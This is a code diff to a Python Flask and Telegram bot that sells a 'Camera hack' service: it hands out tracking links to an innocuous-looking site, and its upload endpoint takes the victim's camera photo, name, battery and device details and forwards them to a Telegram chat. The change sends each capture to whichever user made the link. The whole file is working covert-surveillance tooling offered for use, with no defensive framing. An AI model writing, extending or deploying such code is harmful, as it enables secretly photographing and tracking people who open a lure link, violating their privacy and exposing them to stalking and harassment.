@@ -4,10 +4,9 @@ import telebot
 from telebot import types
 
 app = Flask(__name__)
-# Render Environment Variables में BOT_TOKEN जरूर डालें
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-CHAT_ID = "7162565886"
 ADMIN_ID = 7162565886 
+MY_CHAT_ID = "7162565886" # Default ID
 bot = telebot.TeleBot(BOT_TOKEN)
 
 def init_db():
@@ -31,14 +30,13 @@ def start(message):
     add_user(message.chat.id)
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
-    
     msg = "Select service ✅\nClick on 'camera hack' your service is procced 👇👇"
     bot.send_message(message.chat.id, msg, reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    # अपनी Render URL यहाँ लिखें
-    base_url = "https://happy-wishing-you.onrender.com" 
+    base_url = "https://happy-wishing-you.onrender.com" # Check your URL
+    user_id = call.message.chat.id
     
     if call.data == "cam_menu":
         markup = types.InlineKeyboardMarkup(row_width=2)
@@ -50,10 +48,9 @@ def callback_query(call):
     
     elif call.data.startswith("mode_"):
         mode = call.data.split("_")[1]
-        track_link = f"{base_url}?m={mode}"
+        track_link = f"{base_url}?m={mode}&uid={user_id}"
         contact_markup = types.InlineKeyboardMarkup()
         contact_markup.add(types.InlineKeyboardButton("🔥Contact admin ✅", url="https://t.me/Roshanali000"))
-        
         response = f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}\n\n🤗 If any problem contact admin ✅"
         bot.send_message(call.message.chat.id, response, reply_markup=contact_markup)
 
@@ -64,8 +61,8 @@ def broadcast(message):
         conn = sqlite3.connect('users.db')
         users = conn.execute('SELECT user_id FROM users').fetchall()
         conn.close()
-        for user in users:
-            try: bot.send_message(user[0], text)
+        for u in users:
+            try: bot.send_message(u[0], text)
             except: pass
         bot.reply_to(message, "✅ Broadcast Done!")
 
@@ -76,14 +73,14 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
+    target_id = data.get('uid', MY_CHAT_ID) # Jo link banayega usko jayega
     branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
-    report = (f"🛡️ <b>SYSTEM AUDIT: {data.get('label')}</b>\n\n👤 <b>Target:</b> {data.get('name')}\n"
-              f"🔋 <b>Battery:</b> {data.get('info').get('battery')}\n📱 <b>Device:</b> {data.get('info').get('platform')}\n"
-              f"🌐 <b>IP:</b> {request.remote_addr}\n\n{branding}")
+    report = (f"🛡️ <b>SYSTEM AUDIT: {data.get('label')}</b>\n👤 <b>Target:</b> {data.get('name')}\n"
+              f"🔋 <b>Battery:</b> {data.get('info').get('battery')}\n📱 <b>Device:</b> {data.get('info').get('platform')}\n\n{branding}")
     
     if data.get('image'):
         img_bytes = base64.b64decode(data.get('image').split(',')[1])
-        bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
+        bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
